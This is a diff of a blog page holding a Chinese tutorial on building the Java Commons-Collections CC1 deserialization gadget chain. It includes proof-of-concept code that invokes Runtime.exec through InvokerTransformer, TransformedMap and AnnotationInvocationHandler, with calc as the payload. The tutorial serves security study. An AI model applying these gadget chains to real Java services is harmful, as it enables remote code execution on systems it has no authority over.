@@ -291,25 +291,25 @@
                 
 
                 <blockquote>
-<p>本文首发于 FreeBuf <a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/335892.html" >https://www.freebuf.com/articles/web/335892.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>本文首发于 FreeBuf <a class="link" target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/335892.html">https://www.freebuf.com/articles/web/335892.html<i class="fas fa-external-link-alt"></i></a></p>
 </blockquote>
 <span id="more"></span>
 <h1 id="Java反序列化CommonsCollections篇01-CC1链"><a href="#Java反序列化CommonsCollections篇01-CC1链" class="headerlink" title="Java反序列化CommonsCollections篇01-CC1链"></a>Java反序列化CommonsCollections篇01-CC1链</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>反序列化的漏洞，find usages 的部分，都建议大家手动去找一找，</p>
 <h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><ul>
-<li><a class="link"   target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html" >JDK8u65<i class="fas fa-external-link-alt"></i></a></li>
-<li><a class="link"   target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4" >openJDK 8u65<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">JDK8u65<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65<i class="fas fa-external-link-alt"></i></a></li>
 <li>Maven 3.6.3(其余版本可以先试试，不行再降版本)</li>
 </ul>
 <blockquote>
-<p>当时环境搭建踩了好多坑，😭😭😭😭😭😭 多亏了 <a class="link"   target="_blank" rel="noopener" href="http://miku233.viewofthai.link/" >mikufans师傅<i class="fas fa-external-link-alt"></i></a></p>
+<p>当时环境搭建踩了好多坑，😭😭😭😭😭😭 多亏了 <a class="link" target="_blank" rel="noopener" href="http://miku233.viewofthai.link/">mikufans师傅<i class="fas fa-external-link-alt"></i></a></p>
 </blockquote>
 <p>首先 jdk 版本这里，要求的是 jdk8u65 的，如果我们用 jdk8u71 这种，CC 链的漏洞就被修掉了，用不了。</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html" >jdk8u65下载链接<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">jdk8u65下载链接<i class="fas fa-external-link-alt"></i></a></p>
 <p>再接着，创建一个 IDEA 项目，选中 maven，并使用 jdk8u65</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/EnvRoot.png" class>
 
 <p>创建完成之后，选中 Project Structure，修改 Modules</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/EnvLanguageLevel.png" class>
 
 <p>再添加 Maven 中，对 CC1 链的依赖包。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:<span class="comment">//mvnrepository.com/artifact/commons-collections/commons-collections --&gt;  </span></span><br><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;commons-collections&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
@@ -317,7 +317,7 @@
 <p>使用 <code>maven clean + maven install</code></p>
 <p>很不幸的是，我这里报错了，报错内容为<code>org.codehaus.plexus.components.io.resources.PlexusIoResourceCollection</code></p>
 <p>后续，我点击了 Maven Download Source 就可以用了。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/MavenDownloadSource.png" class>
 
 <ul>
 <li>再说一说如何验证环境导入成功吧，我们 import CC 的包</li>
@@ -328,15 +328,15 @@
 <p>我们还要做一件事，修改 sun 包。</p>
 <p>因为我们打开源码，很多地方的文件是 .class 文件，是已经编译完了的文件，都是反编译代码，我们很难读懂，所以需要把它转换为 .java 文件。</p>
 <ul>
-<li><a class="link"   target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4" >openJDK 8u65<i class="fas fa-external-link-alt"></i></a> ———— 去到这个下载链接，点击 zip</li>
+<li><a class="link" target="_blank" rel="noopener" href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4">openJDK 8u65<i class="fas fa-external-link-alt"></i></a> ———— 去到这个下载链接，点击 zip</li>
 </ul>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/OpenJdk.png" class>
 
 <p>将其解压之后，先搁一边，我们解压 jdk8u65 的 src.zip，解压完之后，我们把 openJDK 8u65 解压出来的 sun 文件夹拷贝进 jdk8u65 中，这样子就能把 .class 文件转换为 .java 文件了。</p>
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/CodeDown.png" class>
 
-
-<h2 id="0x03-Common-Collections-相关介绍"><a href="#0x03-Common-Collections-相关介绍" class="headerlink" title="0x03 Common-Collections 相关介绍"></a>0x03 Common-Collections 相关介绍</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/" >闪烁之狐<i class="fas fa-external-link-alt"></i></a>大佬说的很清楚了 ~ 我这里借用一下</p>
-<p><a class="link"   target="_blank" rel="noopener" href="http://commons.apache.org/" >Apache Commons<i class="fas fa-external-link-alt"></i></a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p>
+<h2 id="0x03-Common-Collections-相关介绍"><a href="#0x03-Common-Collections-相关介绍" class="headerlink" title="0x03 Common-Collections 相关介绍"></a>0x03 Common-Collections 相关介绍</h2><p><a class="link" target="_blank" rel="noopener" href="https://blinkfox.github.io/2018/09/13/hou-duan/java/commons/commons-collections-bao-he-jian-jie/">闪烁之狐<i class="fas fa-external-link-alt"></i></a>大佬说的很清楚了 ~ 我这里借用一下</p>
+<p><a class="link" target="_blank" rel="noopener" href="http://commons.apache.org/">Apache Commons<i class="fas fa-external-link-alt"></i></a>是Apache软件基金会的项目，曾经隶属于<code>Jakarta</code>项目。<code>Commons</code>的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：<code>Proper</code>（是一些已发布的项目）、<code>Sandbox</code>（是一些正在开发的项目）和<code>Dormant</code>（是一些刚启动或者已经停止维护的项目）。</p>
 <ul>
 <li>简单来说，Common-Collections 这个项目开发出来是为了给 Java 标准的 <code>Collections API</code> 提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。</li>
 </ul>
@@ -358,33 +358,33 @@
 <li>首先我们再次明确一下反序列化的攻击思路。</li>
 </ul>
 <p>入口类这里，我们需要一个 <code>readObject</code> 方法，结尾这里需要一个能够命令执行的方法。我们中间通过链子引导过去。所以我们的攻击一定是从尾部出发去寻找头的，流程图如下。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/AttackRoad.png" class>
 
 <h3 id="1-寻找尾部的-exec-方法"><a href="#1-寻找尾部的-exec-方法" class="headerlink" title="1. 寻找尾部的 exec 方法"></a>1. 寻找尾部的 exec 方法</h3><ul>
 <li>总结出前人挖洞的思路，我们这里加速，去到 Transformer 接口看一看</li>
 </ul>
 <p>快捷键 ctrl + alt + B，查看实现接口的类。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/TransformerInterface.png" class>
 
 <p>我先是寻找了 <code>MapTransformer</code>，再寻找了 <code>InvokerTransformer</code> 成功找到了我们需要的尾部 ———— 命令执行</p>
 <ul>
 <li>在 <code>InvokerTransformer</code> 类中存在一个反射调用任意类，可以作为我们链子的终点。</li>
 </ul>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/InvokeTransformer.png" class>
 
 <p>看到这里有漏洞，我们先尝试构造一下，调用这个类的弹计算器。</p>
 <p>在调用这个类之前，我们先回顾一下反射的命令执行的代码。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.omg.SendingContext.RunTime;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokeTransformerTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"> <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;  </span><br><span class="line"> <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);  </span><br><span class="line"> method.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> method.invoke(runtime, <span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/ReflectEXP.png" class>
 
 <p>接下来我们构造一个利用 <code>InvokerTransformer</code> 类弹计算器的程序。</p>
 <p>根据构造方法构造 EXP，因为是 public 的方法，这里无需反射。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/InvokeTransformerConstruct.png" class>
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokeTransformerTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"> <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;  </span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line"> invokerTransformer.transform(runtime);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/InvokeTransformerTest.png" class>
 
 <ul>
 <li>注意我们最后一句 <code>invokerTransformer.transform(runtime);</code></li>
@@ -393,18 +393,18 @@
 <h3 id="2-初步寻找链子"><a href="#2-初步寻找链子" class="headerlink" title="2. 初步寻找链子"></a>2. 初步寻找链子</h3><p>右键 —&gt; find usages，如果 find usages 这里有问题的话，可以先 <code>Ctrl+Alt+Shift+F7</code>，选择 <code>All place</code> 查询。</p>
 <p>节省时间，我这里直接把结果贴出来。</p>
 <p>其中 <code>TransformedMap</code> 类中存在 <code>checkSetValue()</code> 方法调用了 <code>transform()</code> 方法。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/CheckSetValueCode.png" class>
 
 <ul>
 <li>OK，接下来我们去看一看 <code>valueTransformer.checkSetValue</code> 的 <code>valueTransformer</code> 是什么东西，最终在 <code>TransformedMap</code> 的构造函数中发现了 <code>valueTransformer</code></li>
 </ul>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/TransformedMapConstructor.png" class>
 
 <ul>
 <li>因为 <code>TransformedMap</code> 的构造方法作用域是 <code>protected</code>，我们还需要去找一找谁调用了 <code>TransformedMap</code> 的构造方法。</li>
 </ul>
 <p>在 <code>decorate()</code> 静态方法中创建了 <code>TransformedMap</code> 对象</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/decorate.png" class>
 
 <p>到这一步，尝试将其作为链子的开头，编写 POC</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">decorateCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"> <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>  </span><br><span class="line"> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line"> Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class;  </span><br><span class="line"> <span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);  </span><br><span class="line"> checkSetValueMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line"> checkSetValueMethod.invoke(decorateMap, runtime);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -415,7 +415,7 @@
 <li>在执行 <code>.decorate</code> 方法的时候，会新建 <code>TransformedMap</code> 对象，我们调用对象的 <code>checkSetValue</code> 方法（因为我们无法直接获取 <code>TransformedMap</code> 对象，它的作用域是 <code>protected</code>）。</li>
 <li>在 <code>checkSetValue</code> 方法当中，会执行 <code>.transform</code> 的方法。这也就是我们链子的尾部 ———— <code>.transform</code></li>
 </ul>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/Origin.png" class>
 
 <p>这么一看，调用 <code>.decorate</code> 方法就很有必要了，这几句语句是为了运用 <code>.decorate</code> 方法而存在的。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>  </span><br><span class="line"> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"><span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure>
@@ -427,32 +427,32 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">checkSetValueMethod</span> <span class="operator">=</span> transformedMapClass.getDeclaredMethod(<span class="string">&quot;checkSetValue&quot;</span>, Object.class);  </span><br><span class="line">checkSetValueMethod.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">checkSetValueMethod.invoke(decorateMap, runtime);</span><br></pre></td></tr></table></figure>
 
 <p>至此 Poc 就构造完毕了 ~</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/decoratePOC.png" class>
 
 <h3 id="3-完整链子"><a href="#3-完整链子" class="headerlink" title="3. 完整链子"></a>3. 完整链子</h3><ul>
 <li>目前找到的链子位于 <code>checkSetValue</code> 当中，去找 <code>.decorate</code> 的链子，发现无法进一步前进了，所以我们回到 <code>checkSetValue</code> 重新找链子。</li>
 </ul>
 <p>继续 <code>find usages</code>，找到了 <code>parent.checkSetValue(value);</code> 调用了 <code>checkSetValue</code></p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/FindCheckSetValue.png" class>
 
 <p>我们点进去看，发现这是一个抽象类，是 <code>TransformedMap</code> 的父类。</p>
 <ul>
 <li>调用 <code>checkSetValue</code> 方法的类是 <code>AbstractInputCheckedMapDecorator</code> 类中的一个内部类 <code>MapEntry</code></li>
 </ul>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/MapEntry.png" class>
 
 <p><code>setValue()</code> <strong>实际上就是在 Map 中对一组 entry（键值对）</strong>进行 <code>setValue()</code> 操作。</p>
 <blockquote>
 <p>这里细心跟一下是可以跟到的</p>
 </blockquote>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/setValueWhat.png" class>
 <p>所以，我们在进行 <code>.decorate</code> 方法调用，进行 Map 遍历的时候，就会走到 <code>setValue()</code> 当中，而 <code>setValue()</code> 就会调用 <code>checkSetValue</code></p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/setValue.png" class>
 <p>我们可以写一段代码来调试一下，看一看在遍历 Map 的时候，会不会走到 <code>setValue</code> 中。在 <code>setValue</code> 的 192 行打个断点，并修改一下我们的 Poc</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetValueTest01</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();  </span><br><span class="line"> <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>  </span><br><span class="line"> , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line"> HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line"> hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line"> Map&lt;Object, Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line"> <span class="keyword">for</span> (Map.Entry entry:decorateMap.entrySet())&#123;  </span><br><span class="line">            entry.setValue(runtime);  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>诶嘿！果然跳进来了，并且在代码执行完后也会弹出计算器</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/setValueDebug.png" class>
 
 <ul>
 <li>到此处，我们的攻击思路出来了，找到一个是数组的入口类，遍历这个数组，并执行 <code>setValue</code> 方法，即可构造 Poc。</li>
@@ -466,16 +466,16 @@
 <li>之前链子是到 <code>setValue</code> 的，所以我们在 <code>setValue</code> 处，find usages</li>
 </ul>
 <p>成功找到了一个 <code>readObject()</code> 的入口类！</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/readObject.png" class>
 
 <ul>
 <li>我们注意到类的名字为 <code>AnnotationInvocationHandler</code>，<code>InvocationHandler</code> 这个后缀，我在动态代理里面提到过，是用做<strong>动态代理中间处理</strong>，因为它继承了 <code>InvocationHandler</code> 接口。</li>
 </ul>
 <p>要调用 <code>setValue()</code> 方法，我们需要完成下图的要求。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/readObjectToSetValue.png" class>
 
 <p>然后，<code>readObject</code> 的方法是类 <code>AnnotationInvocationHandler</code> 的，<code>AnnotationInvocationHandler</code> 的作用域为 <code>default</code>，我们需要通过反射的方式来获取这个类及其构造函数，再实例化它。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/AnnotationInvocationHandler.png" class>
 
 <ul>
 <li>下面我们来手写 EXP</li>
@@ -494,7 +494,7 @@
 <blockquote>
 <p>②：<code>setValue()</code> 的传参，是需要传 <code>Runtime</code> 对象的；而在实际情况当中的 <code>setValue()</code> 的传参是这个东西</p>
 </blockquote>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/ProblemOne.png" class>
 
 <blockquote>
 <p>③：解决上文提到的，要进入 <code>setValue</code> 的两个 if 判断</p>
@@ -503,7 +503,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FinalEXP;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SolvedProblemRuntime</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Runtime.class;  </span><br><span class="line"> <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>);  </span><br><span class="line"> <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> (Runtime) method.invoke(<span class="literal">null</span>, <span class="literal">null</span>);  </span><br><span class="line"> <span class="type">Method</span> <span class="variable">run</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);  </span><br><span class="line"> run.invoke(runtime, <span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>接着，我们将这个反射的 <code>Runtime</code> 改造为使用 <code>InvokerTransformer</code> 调用的方式。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/SolvedProblemRuntime.png" class>
 
 <p>稍微理一理可以看到，上方主函数最后三行代码有一个共同点就是：</p>
 <ul>
@@ -511,7 +511,7 @@
 <li>后一个 <code>invoke()</code> 方法里的参数都是前一个的结果</li>
 </ul>
 <p>从代码的复用性角度来说，我们应当减少这种复用的工作量，于是我们使用 <code>ChainedTransformer</code> 这个类。</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/ChainedTransformer.png" class>
 
 <p><code>ChainedTransformer</code> 类下的 <code>transform</code> 方法递归调用了前一个方法的结果，作为后一个方法的参数。</p>
 <ul>
@@ -529,31 +529,31 @@
 </li>
 </ul>
 <p>调试结果如图</p>
-
+<img src="/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/DebugIF.png" class>
 
 <p>我们的 EXP 并没有走到 <code>setValue</code> 中去，而是在第一个 if 就跳出去了。</p>
